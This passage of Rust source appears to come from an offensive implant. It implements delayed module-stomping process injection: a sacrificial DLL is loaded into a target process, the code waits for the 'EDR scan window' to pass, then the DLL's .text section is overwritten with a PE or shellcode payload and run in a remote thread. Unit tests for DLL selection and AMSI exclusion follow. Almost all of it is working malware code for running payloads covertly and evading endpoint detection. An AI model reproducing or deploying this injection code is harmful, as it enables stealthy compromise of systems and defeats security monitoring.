        "[delayed-stomp] Phase 1 complete. Delay: {}s before stomp",
        delay_secs
    );

    Ok(PendingStomp {
        target_pid,
        process_handle,
        dll_base,
        text_section_size: text_size,
        text_section_va: text_va,
        entry_point_rva: entry_rva,
        is_pe,
        payload: payload.to_vec(),
        delay_secs,
        dll_name,
    })
}

// ── Phase 2: Stomp and execute ───────────────────────────────────────────────

/// Phase 2 of delayed stomp: overwrite .text section and execute payload.
///
/// This is called after the delay has elapsed.
pub unsafe fn phase2_stomp_and_execute(
    pending: &PendingStomp,
) -> Result<InjectionHandle> {
    let process_handle = pending.process_handle as *mut c_void;

    log::info!(
        "[delayed-stomp] Phase 2: stomping {} at {:#x} ({} byte payload)",
        pending.dll_name,
        pending.text_section_va,
        pending.payload.len()
    );

    // Overwrite .text section
    stomp_text_section(
        process_handle,
        pending.text_section_va,
        pending.text_section_size,
        &pending.payload,
    )
    .with_context(|| "failed to stomp .text section")?;

    // Determine entry point
    let entry_address = if pending.is_pe {
        // Fix relocations and get entry point
        let ep_rva = fix_relocations(process_handle, pending.dll_base, &pending.payload)
            .unwrap_or(0);
        pending.dll_base + ep_rva as usize
    } else {
        // Raw shellcode: entry = start of .text section
        pending.text_section_va
    };

    log::info!(
        "[delayed-stomp] Entry point: {:#x}",
        entry_address
    );

    // Execute
    let thread_handle = execute_payload(process_handle, entry_address)
        .with_context(|| "failed to execute payload")?;

    log::info!(
        "[delayed-stomp] Payload executing in PID {} via thread {:#x}",
        pending.target_pid,
        thread_handle
    );

    Ok(InjectionHandle {
        target_pid: pending.target_pid,
        technique_used: InjectionTechnique::DelayedModuleStomp,
        injected_base_addr: pending.dll_base,
        payload_size: pending.payload.len(),
        thread_handle: Some(thread_handle as *mut c_void),
        process_handle,
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

// ── Full injection pipeline ──────────────────────────────────────────────────

/// Convenience function: perform the full delayed stomp injection
/// (Phase 1 + wait + Phase 2) in a blocking fashion.
///
/// For non-blocking usage, use `phase1_load()` and schedule `phase2_stomp_and_execute()`
/// via the agent's timer infrastructure.
pub unsafe fn inject_delayed_stomp(
    target_pid: u32,
    payload: &[u8],
    min_delay_secs: u32,
    max_delay_secs: u32,
) -> Result<InjectionHandle> {
    // Phase 1: Load DLL
    let pending = phase1_load(target_pid, payload, min_delay_secs, max_delay_secs)?;

    // Wait for the delay
    log::info!(
        "[delayed-stomp] Waiting {} seconds for EDR scan window to pass...",
        pending.delay_secs
    );
    std::thread::sleep(std::time::Duration::from_secs(pending.delay_secs as u64));

    // Phase 2: Stomp and execute
    phase2_stomp_and_execute(&pending)
}

// ── Background thread version (non-blocking) ─────────────────────────────────

/// Spawn a background thread that performs the delayed stomp after the delay.
/// Returns immediately with the PendingStomp info (Phase 1 result).
///
/// The actual `InjectionHandle` result is logged; the operator can query
/// injection status to see if Phase 2 completed.
pub fn inject_delayed_stomp_async(
    target_pid: u32,
    payload: Vec<u8>,
    min_delay_secs: u32,
    max_delay_secs: u32,
) -> Result<String> {
    // Phase 1 must run on the calling thread (uses pe_resolve which is
    // thread-local in some configurations)
    let pending = unsafe { phase1_load(target_pid, &payload, min_delay_secs, max_delay_secs) }?;

    let delay_secs = pending.delay_secs;
    let dll_name = pending.dll_name.clone();
    let dll_base = pending.dll_base;

    // Spawn background thread for the wait + Phase 2
    std::thread::Builder::new()
        .name("delayed-stomp-phase2".into())
        .spawn(move || {
            log::info!(
                "[delayed-stomp] Phase 2 thread: waiting {}s...",
                delay_secs
            );
            std::thread::sleep(std::time::Duration::from_secs(delay_secs as u64));

            match unsafe { phase2_stomp_and_execute(&pending) } {
                Ok(handle) => {
                    log::info!(
                        "[delayed-stomp] Phase 2 complete: PID={}, base={:#x}, size={}",
                        handle.target_pid,
                        handle.injected_base_addr,
                        handle.payload_size
                    );
                }
                Err(e) => {
                    log::error!("[delayed-stomp] Phase 2 failed: {e:#}");
                }
            }
        })
        .map_err(|e| anyhow!("failed to spawn phase 2 thread: {e}"))?;

    Ok(serde_json::json!({
        "status": "phase1_complete",
        "target_pid": target_pid,
        "dll_name": dll_name,
        "dll_base": format!("{:#x}", dll_base),
        "delay_secs": delay_secs,
        "message": format!("DLL loaded, stomp scheduled in {}s", delay_secs),
    })
    .to_string())
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_sacrificial_dlls_nonempty() {
        let dlls = get_sacrificial_dlls();
        assert!(!dlls.is_empty(), "sacrificial DLL list should not be empty");
        assert!(dlls.len() >= 20, "should have at least 20 candidates");
    }

    #[test]
    fn test_dll_selection_excludes_loaded() {
        let modules = vec![
            ModuleInfo {
                base: 0x70000000,
                size: 0x10000,
                name: "version.dll".into(),
            },
            ModuleInfo {
                base: 0x70010000,
                size: 0x10000,
                name: "dwmapi.dll".into(),
            },
        ];
        let candidates = vec![
            "version.dll".into(),
            "dwmapi.dll".into(),
            "msctf.dll".into(),
        ];
        let selected = select_sacrificial_dll(&modules, &candidates);
        assert_eq!(selected.unwrap(), "msctf.dll");
    }

    #[test]
    fn test_dll_selection_all_loaded() {
        let modules = vec![
            ModuleInfo {
                base: 0x70000000,
                size: 0x10000,
                name: "version.dll".into(),
            },
        ];
        let candidates = vec!["version.dll".into()];
        let selected = select_sacrificial_dll(&modules, &candidates);
        assert!(selected.is_none());
    }

    #[test]
    fn test_excluded_dlls() {
        assert!(is_excluded("ntdll.dll"));
        assert!(is_excluded("kernel32.dll"));
        assert!(is_excluded("amsi.dll"));
        assert!(!is_excluded("version.dll"));
        assert!(!is_excluded("dwmapi.dll"));
    }

    #[test]
    fn test_delay_range() {
        // Test that delay is within range
        for _ in 0..100 {
            let now = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_nanos() as u32;
            let min = 8u32;
            let max = 15u32;
            let range = max - min;
            let delay = min + (now.wrapping_mul(1103515245).wrapping_add(12345) % range);
            assert!(delay >= min && delay <= max, "delay {} not in [{},{}]", delay, min, max);
        }
    }

    #[test]
    fn test_pending_stomp_drop_zeros_payload() {
        let mut pending = PendingStomp {
            target_pid: 1234,
            process_handle: 0,
            dll_base: 0x70000000,
            text_section_size: 0x10000,
            text_section_va: 0x70001000,
            entry_point_rva: 0x1000,
            is_pe: false,
            payload: vec![0xDE, 0xAD, 0xBE, 0xEF],
            delay_secs: 10,
            dll_name: "test.dll".into(),
        };
        // Drop should zero the payload
        let ptr = pending.payload.as_ptr();
        drop(pending);
        // After drop, the memory may be reused — we can't reliably test
        // the zeroing without unsafe, so this test just verifies no panic.
    }

    #[test]
    fn test_is_pe_detection() {
        let pe_payload = vec![b'M', b'Z', 0x90, 0x00];
        assert!(pe_payload.len() >= 2 && pe_payload[0] == b'M' && pe_payload[1] == b'Z');

        let shellcode = vec![0x48, 0x31, 0xC0, 0xC3];
        assert!(
            !(shellcode.len() >= 2 && shellcode[0] == b'M' && shellcode[1] == b'Z')
        );
    }

    #[test]
    fn test_init_sacrificial_dlls() {
        let custom = vec!["custom1.dll".into(), "custom2.dll".into()];
        init_sacrificial_dlls(custom.clone());
        // After init, get_sacrificial_dlls returns the custom list
        let dlls = get_sacrificial_dlls();
        assert_eq!(dlls.len(), 2);
        assert_eq!(dlls[0], "custom1.dll");
    }
}
